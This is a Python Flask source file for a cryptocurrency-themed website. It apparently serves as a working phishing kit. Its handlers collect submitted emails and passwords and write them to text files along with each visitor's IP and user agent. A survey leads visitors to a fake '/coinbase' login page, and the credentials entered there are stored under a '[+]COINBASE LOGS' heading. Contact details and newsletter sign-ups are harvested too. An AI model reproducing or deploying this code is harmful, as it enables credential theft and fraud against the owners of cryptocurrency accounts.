from crypt import methods
from fnmatch import fnmatchcase
from platform import platform
from click import format_filename
from flask import Flask, redirect, render_template, url_for, Blueprint, request
import json, string, requests
from datetime import datetime

app = Blueprint('app', __name__)

def add_data(data, file):
    with open(file, 'a') as f:
        f.write(data)
    
def coin_price(coin):
    key = 'https://api.binance.com/api/v3/ticker/price?symbol='
    coin = coin.upper()
    fullkey = key+coin+'USDT'
    price = requests.get(fullkey)
    price = price.json()
    return round(float(price["price"]), 3)


@app.route('/')
def index():
    user_agent = request.headers.get('User-Agent')
    content = {}
    btc_price = coin_price('btc')
    eth_price = coin_price('eth')
    ltc_price = coin_price('ltc')
    dash_price = coin_price('dash')
    content['btc'] = btc_price
    content['eth'] = eth_price
    content['ltc'] = ltc_price
    content['dash'] = dash_price
    return render_template('index.html', content=content)

@app.route('/', methods=['POST'])
def index_post():
    user_data = {}
    user_data['ip'] = request.remote_addr
    user_data['user_agent'] = request.headers.get('User-Agent')

    email = request.form.get('mail')
    passwd = request.form.get('passwd')
    contactfname = request.form.get('fname')
    contactlname = request.form.get('lname')
    phone = request.form.get('phone')
    contactemail = request.form.get('email')
    contactmessage = request.form.get('message')
    newsfname = request.form.get('fullname')
    newsemail = request.form.get('email')
    if email and passwd:
        add_data(str(user_data)+'\n'+'EMAIL: '+email+'---- '+'PASSWD: '+passwd + '\n', 'logs.txt')
        return redirect(url_for('app.thankyou'))
    elif contactfname and contactlname and phone and contactemail and contactmessage:
        add_data(str(user_data)+ f'\nFN: {contactfname} \nLN: {contactlname} \nPHONE: {phone} \nEMAIL: {contactemail}\nMESSAGE: {contactmessage}  \n', 'contact.txt')
        return redirect(url_for('app.thankscontact'))
    elif newsfname and newsemail:
        add_data(str(user_data)+f'\nNEWSNAME: {newsfname}\nNEWSEMAIL: {newsemail} \n', 'news.txt')
        return redirect(url_for('app.thankscontact'))


@app.route('/survey')
def survey():
    return render_template('survey.html')

@app.route('/survey', methods=['POST'])
def survey_post():
    survey_data = {}
    user_data = {}
    user_data['ip'] = request.remote_addr
    user_data['user_agent'] = request.headers.get('User-Agent')
    survey_data['country'] = request.form.get('country')
    survey_data['heardof'] = request.form.get('heardof')
    survey_data['owncrypto'] = request.form.get('owncrypto')
    survey_data['forf'] = request.form.get('forf')
    survey_data['doyouthink'] = request.form.get('doyouthink')
    survey_data['platform'] = request.form.get('platform')
    survey_data['message'] = request.form.get('message')
    add_data('USER: '+str(user_data)+'\nSURVEY-DATA: '+str(survey_data)+'\n', 'survey.txt')
    
    return redirect(url_for('app.coinbase'))

@app.route('/postsurvey')
def postsurvey():
    
    return render_template('postsurvey.html')



@app.route('/coinbase')
def coinbase():
    return render_template('coinbase.html')

@app.route('/coinbase', methods=['POST'])
def coinbase_post():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    email = request.form.get('email')
    passwd = request.form.get('password')
    add_data(f'[+]COINBASE LOGS: \nIP: {ip}\nUA: {user_agent}\nEMAIL: {email}\nPASSWD: {passwd}', 'coinbase.txt')
    return redirect(url_for('app.thankssurvey'))

@app.route('/thankssurvey')
def thankssurvey():
    return render_template('thankssurvey.html')

@app.route('/thankscontact')
def thankscontact():
    return render_template('thankscontact.html')

@app.route('/thankyou')
def thankyou():
    return render_template('thankyou.html')

@app.route('/testiframe')
def testiframe():
    return render_template('iframe.html')